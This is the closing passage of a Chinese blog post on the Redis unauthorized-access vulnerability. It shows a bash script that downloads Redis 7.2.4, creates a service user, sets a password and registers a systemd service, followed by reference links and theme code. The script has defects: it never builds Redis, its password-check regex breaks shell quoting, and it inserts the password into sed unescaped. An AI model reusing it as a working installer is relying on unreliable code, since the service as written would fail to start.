+<h2 id="安装脚本"><a href="#安装脚本" class="headerlink" title="安装脚本"></a>安装脚本</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">检查是否为root用户</span><br>if [ &quot;$(id -u)&quot; -eq 0 ]; then<br>    # 提示用户输入要创建的 Redis 用户名<br>    read -rp &quot;请输入要创建的 Redis 用户名：&quot; redis_user<br><br>    # 密码验证循环<br>    while true; do<br>        # 使用 getpass 获取密码，避免在命令行显示<br>        read -s -p &quot;请设置 Redis 密码认证（至少8个字符，包含字母、数字和特殊字符）：&quot; redis_password<br><br>        # 密码强度验证<br>        if [[ $(echo &quot;$redis_password&quot; | grep -E &#x27;.*[a-z].*&#x27; | wc -l) -eq 1 ]] &amp;&amp; [[ $(echo &quot;$redis_password&quot; | grep -E &#x27;.*[A-Z].*&#x27; | wc -l) -eq 1 ]] &amp;&amp; [[ $(echo &quot;$redis_password&quot; | grep -E &#x27;.*[0-9].*&#x27; | wc -l) -eq 1 ]] &amp;&amp; [[ $(echo &quot;$redis_password&quot; | grep -E &#x27;.*[!@#$%^&amp;*()_+\-=\[\]&#123;&#125;;&#x27;:&quot;\\|,.&lt;&gt;\/?].*&#x27; | wc -l) -eq 1 ]] &amp;&amp; [[ $&#123;#redis_password&#125; -ge 8 ]]; then<br>            break<br>        else<br>            echo &quot;密码强度不足，请重新输入。&quot;<br>        fi<br>    done<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">切换到临时目录</span><br>cd /tmp || exit<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">下载 Redis 压缩包</span><br>echo &quot;正在下载 Redis 压缩包...&quot;<br>wget -nv http://download.redis.io/releases/redis-7.2.4.tar.gz<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">解压 Redis 压缩包</span><br>echo &quot;正在解压 Redis 压缩包...&quot;<br>tar -zvxf redis-7.2.4.tar.gz<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">移动 Redis 文件夹到 /usr/local</span><br>echo &quot;正在移动 Redis 文件夹到 /usr/local...&quot;<br>mv /tmp/redis-7.2.4 /usr/local/redis<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">创建 Redis 用户</span><br>echo &quot;正在创建 Redis 用户...&quot;<br>useradd -s /sbin/nologin -M &quot;$redis_user&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置 Redis 文件夹权限，确保 Redis 用户对文件夹有读写权限</span><br>chown -R &quot;$redis_user:$redis_user&quot; /usr/local/redis<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">复制 Redis 配置文件并设置密码认证</span><br>echo &quot;正在配置 Redis 密码认证...&quot;<br>cp /usr/local/redis/redis.conf /usr/local/redis/redis.conf.backup<br>sed -i &quot;s/^# requirepass foobared$/requirepass $redis_password/&quot; /usr/local/redis/redis.conf<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用 systemd 管理 Redis 服务</span><br>echo &quot;正在配置 Redis 服务...&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">创建 systemd 服务文件</span><br>cat &gt; /etc/systemd/system/redis.service &lt;&lt;EOF<br>[Unit]<br>Description=Redis Server<br>After=network.target<br><br>[Service]<br>User=$redis_user<br>Group=$redis_user<br>WorkingDirectory=/usr/local/redis<br>ExecStart=/usr/local/redis/src/redis-server /usr/local/redis/redis.conf<br>ExecReload=/bin/kill -HUP $&#123;MAINPID&#125;<br>ExecStop=/bin/kill -TERM $&#123;MAINPID&#125;<br><br>[Install]<br>WantedBy=multi-user.target<br>EOF<br><br>    # 启动 Redis 服务<br>    echo &quot;正在启动 Redis 服务...&quot;<br>    systemctl daemon-reload &amp;&amp; systemctl enable redis &amp;&amp; systemctl start redis<br><br>    echo &quot;Redis 服务已启动。&quot;<br>else<br>    echo &quot;当前用户非root用户，无法创建 Redis 用户和启动服务。请使用root权限运行该脚本。&quot;<br>fi<br></code></pre></td></tr></table></figure>
+
+<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a target="_blank" rel="noopener" href="https://hellogithub.com/report/db-engines/">https://hellogithub.com/report/db-engines/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zkaqlaoniao/article/details/134441323">https://blog.csdn.net/zkaqlaoniao/article/details/134441323</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_13540373/4861152">https://blog.51cto.com/u_13540373/4861152</a></p>
+<p><a target="_blank" rel="noopener" href="https://xie.infoq.cn/article/f3dc94425d5b586d34e1beae3">https://xie.infoq.cn/article/f3dc94425d5b586d34e1beae3</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" class="print-no-link">#数据库</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>redis未授权访问漏洞</div>
+      <div>http://example.com/2024/05/21/redis未授权访问漏洞/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Sanli Ma</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年5月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/05/08/pip%E6%8F%90%E5%8D%87%E4%B8%8B%E8%BD%BD%E9%80%9F%E5%BA%A6/" title="pip提升下载速度">
+                        <span class="hidden-mobile">pip提升下载速度</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
